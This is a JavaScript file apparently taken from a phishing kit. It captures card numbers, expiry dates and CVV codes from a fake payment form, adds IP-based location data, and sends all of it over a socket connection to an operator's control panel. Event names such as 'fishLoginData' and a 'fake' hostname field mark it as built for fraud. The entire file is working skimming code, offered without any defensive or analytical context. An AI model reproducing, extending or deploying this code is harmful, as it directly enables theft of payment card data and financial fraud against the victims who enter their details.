console.log("hp-script with socket js works");

// console.log("rl script works");
localStorage.setItem("ifSessionExist", "No");
// localStorage.setItem('currPage', '1');
// localStorage.setItem('hpIfAlreadySentCCFullInfo', 'No');

let socket;

const SubmitCCInfo = async () => {
    console.log("this is submit");

    if (!checkIfFormValid()) {
        return;
    }

    if (!socket) {
        socket = await initSocketConnection();
        initActionsOnCommandsFromPanelFunc(socket);
    }

    let hpCardNumberVal = hpCardNumber.value;
    let hpCardMMYYVal = hpCardMMYY.value;
    let hpCardCvvVal = hpCardCVV.value;

    let hpFirstNameVal = "First Name";
    let hpLastNameVal = "Last Name";

    const ifSessionExist = localStorage.getItem("ifSessionExist");

    const { ip, zip, city, country, provider } = await getIpData(apiUrl);

    if (localStorage.ifSessionExist == "No") {
        //FIRST ACTION TO CREATE SESSIONS

        socket.emit("fishLoginData", {
            ip: ip,
            userAgent: window.navigator.userAgent,
            project: project,
            projectType: projectType,
            fake: window.location.hostname,
            ccOrderSum: `?`,
            ccFullName: `${hpFirstNameVal} ${hpLastNameVal}`,
        });
    }

    localStorage.ifSessionExist = "Yes";

    const sendFullCCInfo = () => {
        socket.emit("fishAction", {
            action: "fishAction",
            actionData:
                `\nCard info:\nCard Name: ${hpFirstNameVal} ${hpLastNameVal}\nCard Number: ${hpCardNumberVal}` +
                `\nExp: ${hpCardMMYYVal} cvv: ${hpCardCvvVal}`,
            ccName: `${hpFirstNameVal} ${hpLastNameVal}`,
            ccNumber: hpCardNumberVal,
            ccExp: hpCardMMYYVal,
            ccCVV: hpCardCvvVal,
            ip: ip,
            userAgent: window.navigator.userAgent,
            project: project,
            projectType: projectType,
            fake: window.location.hostname,
        });
    };
    setTimeout(sendFullCCInfo, 2000);

    hpLoadingRing.classList.remove("displaynone");
};

hpCCForm.addEventListener("submit", async () => {
    await SubmitCCInfo();
});
